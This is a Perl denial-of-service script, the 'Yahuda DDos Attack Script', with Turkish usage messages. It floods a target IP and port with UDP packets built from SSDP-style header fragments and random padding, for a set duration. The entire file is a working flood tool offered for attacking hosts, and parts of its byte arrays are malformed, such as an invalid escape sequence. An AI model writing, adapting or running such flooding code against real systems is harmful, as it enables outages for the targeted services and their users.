#!/usr/bin/perl
 
##
# ム Yahuda DDos Attack Script <3 ム
##

use Socket;
use strict;

if ($#ARGV != 3) {



print "
「 ムv2 」 Kullanım : perl yahudav2 127.0.0.1 80 100 9999999\n「 ムv2 」 Coded By Yahuda ፚ
\n";

exit();
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);

	my @hex =("\x4d", "\x2d", "\x53", "\x45", "\x41", "\x52", "\x43", "\x48", "\x20", "\x2a", "\x20", "\x48", "\x54", "\x54", "\x50", "\x2f", "\x31", "\x2e", "\x31", "\x0d", "\x0a", "\x48", "\x4f", "\x53", "\x54", "\x3a", "\x20", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x3a", "\x31", "\x39", "\x30", "\x30", "\x0d", "\x0a", "\x4d", "\x41", "\x4e", "\x3a", "\x20", "\x22", "\x73", "\x73", "\x64", "\x70", "\x3a", "\x64", "\x69", "\x73", "\x63", "\x6f", "\x76", "\x65", "\x72", "\x22", "\x0d", "\x0a", "\x4d", "\x58", "\x3a", "\x20", "\x31", "\x0d", "\x0a", "\x53", "\x54", "\x3a", "\x20", "\x75", "\x72", "\x6e","\x3a", "\x64", "\x69", "\x61", "\x6c", "\x2d", "\x6d", "\x75", "\x6c", "\x74", "\x69", "\x73", "\x63", "\x72", "\x65", "\x65", "\x6e", "\x2d", "\x6f", "\x72", "\x67", "\x3a", "\x73", "\x65", "\x72", "\x76", "\x69", "\x63", "\x65", "\x3a", "\x64", "\x69", "\x61", "\x6c", "\x3a", "\x31", "\x0d", "\x0a", "\x55", "\x53", "\x45", "\x52", "\x2d", "\x41", "\x47", "\x45", "\x4e", "\x54", "\x3a", "\x20", "\x47", "\x6f", "\x6f", "\x67", "\x6c", "\x65", "\x20", "\x43", "\x68", "\x72", "\x6f", "\x6d", "\x65", "\x2f", "\x36", "\x30", "\x2e", "\x30", "\x2e", "\x33", "\x31", "\x31", "\x32", "\x2e", "\x39", "\x30", "\x20", "\x57", "\x69", "\x6e", "\x64", "\x6f", "\x77", "\x73", "\x0d", "\x0a", "\x0d", "\x0a");
		my @hex2 = ("\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e", "\x1f", "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27", "\x28", "\x29", "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f", "\x30", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", "\x37", "\x38", "\x39", "\x3a", "\x3b", "\x3c", "\x3d", "\x3e", "\x3f", "\x40", "\x41", "\x42", "\x43", "\x44", "\x45", "\x46", "\x47", "\x48", "\x49", "\x4a", "\x4b", "\x4c", "\x4d", "\x4e", "\x4f", "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56", "\x57", "\x58", "\x59", "\x5a", "\x5b", "\x5c", "\x5d", "\x5e", "\x5f", "\x60", "\x61", "\x62", "\x63", "\x64", "\x65", "\x66", "\x67", "\x68", "\x69", "\x6a", "\x6b", "\x6c", "\x6d", "\x6e", "\x6f", "\x70", "\x71", "\x72", "\x73", "\x74", "\x75", "\x76", "\x77", "\x78", "\x79", "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f", "\x80", "\x81", "\x82", "\x83", "\x84", "\x85", "\x86", "\x87", "\x88", "\x89", "\x8a", "\x8b", "\x8c", "\x8d", "\x8e", "\x8f", "\x90", "\x91", "\x92", "\x93", "\x94", "\x95", "\x96", "\x97", "\x98", "\x99", "\x9a", "\x9b", "\x9c", "\x9d", "\x9e", "\x9f", "\xa0", "\xa1", "\xa2", "\xa3", "\xa4", "\xa5", "\xa6", "\xa7", "\xa8", "\xa9", "\xaa", "\xab", "\xac", "\xad", "\xae", "\xaf", "\xb0", "\xb1", "\xb2", "\xb3", "\xb4", "\xb5", "\xb6", "\xb7", "\xb8", "\xb9", "\xba", "\xbb", "\xbc", "\xbd", "\xbe", "\xbf", "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", "\xc6", "\xc7", "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd", "\xce", "\xcf", "\xd0", "\xd1", "\xd2", "\xd3", "\xd4", "\xd5", "\xd6", "\xd7", "\xd8", "\xd9", "\xda", "\xdb", "\xdc", "\xdd", "\xde", "\xdf", "\xe0", "\xe1", "\xe2", "\xe3", "\xe4", "\xe5", "\xe6", "\xe7", "\xe8", "\xe9", "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef", "\xf0", "\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7", "\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff");
	my @hex3 = ("\x4D","\x2D","\x53","\x45","\x41","\x52","\x43","\x48","\x20","\x2A","\x20","\x48","\x54","\x54","\x50","\x2F","\x31","\x2E","\x31","\x0A","\x48_ssdp:discover","\x4F","\x53","\x54","\x3A","\x20","\x32","\x33","\x39","\x2E","\x32","\x35","\x35","\x2E","\x32","\x35","\x35","\x2E","\x32","\x35","\x30","\x3A","\x31","\x39","\x30","\x30","\x0A","\x4D","\x41","\x4E","\x3A","\x20","\x22","\x73","\x73","\x64","\x70","\x3A","\x64","\x69","\x73","\x63","\x6F","\x76","\x65","\x72","\x22","\x0A","\x4D","\x58","\x3A","\x20","\x35","\x0A","\x53","\x54","\x3A","\x20","\x75","\x72","\x6E","\x3A","\x77","\x77","\x77","\x2D","\x68","\x75","\x61","\x77","\x65","\x69","\x2D","\x63","\x6F","\x6D","\x3A","\x73","\x65","\x72","\x76","\x69","\x63","\x65","\x3A","\x4E","\x65","\x74","\x77","\x6F","\x72","\x6B","\x53","\x79","\x6E","\x63","\x53","\x65","\x72","\x76","\x69","\x63","\x65","\x3A","\x31");

$iaddr = inet_aton("$ip") or die "「 ムv2 」Kullanım : perl yahudav2 127.0.0.1 80 100 9999999\n「 ムv2 」 Coded By Yahuda ፚ\n";
$endtime = time() + ($time ? $time : 1000000);
		
	socket(flood, PF_INET, SOCK_DGRAM, 17);

print"
「 ムv2 」Yahudav2 - Attack\n「 ムv2 」 Vurulan IP : <$ip>, Port : <$port>, Zaman : <$time>	
";

	for (; time() <= $endtime;) {

		$psize = $size ? $size : int(rand(1500 - 64) + 64);
		$pport = $port ? $port : int(rand(65500)) + 1;

	send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "urn:climbhost-com:firewall" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\x00" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
	send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "ssdp:byebye" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2]. "\x0z" .$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
	send(flood, $hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3]. "urn:ovh-fr:service" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\xF0\x92\x90\xAB" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));

}
